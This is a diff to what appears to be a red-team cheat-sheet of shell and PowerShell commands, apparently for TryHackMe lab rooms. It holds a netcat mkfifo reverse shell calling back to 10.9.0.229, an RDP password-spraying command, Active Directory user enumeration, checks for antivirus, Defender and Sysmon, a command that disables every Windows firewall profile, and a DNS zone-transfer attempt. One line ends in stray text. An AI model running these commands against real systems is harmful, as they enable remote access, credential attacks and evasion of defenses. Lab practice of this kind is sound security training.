@@ -348,6 +348,8 @@ rabin2 -z need_to_talk
 
 netstat -putan
 
+netstat -na
+
 # ECHO Writing #
 
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.229 4485 >/tmp/f" > /home/server-management/Documents/rev.sh
@@ -752,6 +754,69 @@ python3 cupp.py -a
 # RDP Password #
 	
 python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
+
+# Active Directory #
+
+systeminfo | findstr Domain
+
+Get-ADUser  -Filter *
+
+Get-ADUser -Filter * -SearchBase "CN=Users,DC=THMREDTEAM,DC=COM"
+
+# AntiVirus #
+
+wmic /namespace:\\root\securitycenter2 path antivirusproduct
+
+Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+
+Get-Service WinDefend
+
+Get-MpComputerStatus | select RealTimeProtectionEnabled
+
+Get-NetFirewallProfile | Format-Table Name, Enabled
+
+Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
+
+Get-NetFirewallRule | select DisplayName, Enabled, Description
+
+Test-NetConnection -ComputerName 127.0.0.1 -Port 80
+
+Get-MpThreat
+
+Get-NetFirewallRule | findstr "Rule-Name"
+
+Get-EventLog -List
+
+Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
+
+Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
+
+Get-Service | where-object {$_.DisplayName -like "*sysm*"}
+
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
+
+wmic product get name,version
+
+Get-ChildItem -Hidden -Path C:\Users\kkidd\Desktop\
+
+wmic service where "name like 'THM Demo'" get Name,PathName
+
+Get-Process -Name thm-demo
+
+netstat -noa |findstr "LISTENING" |findstr "3212"looku
+
+# NSLookup.exe #
+
+nslookup.exe
+
+server 10.10.191.199
+
+ls -d thmredteam.com
+
+
+
+
+
 
 
 
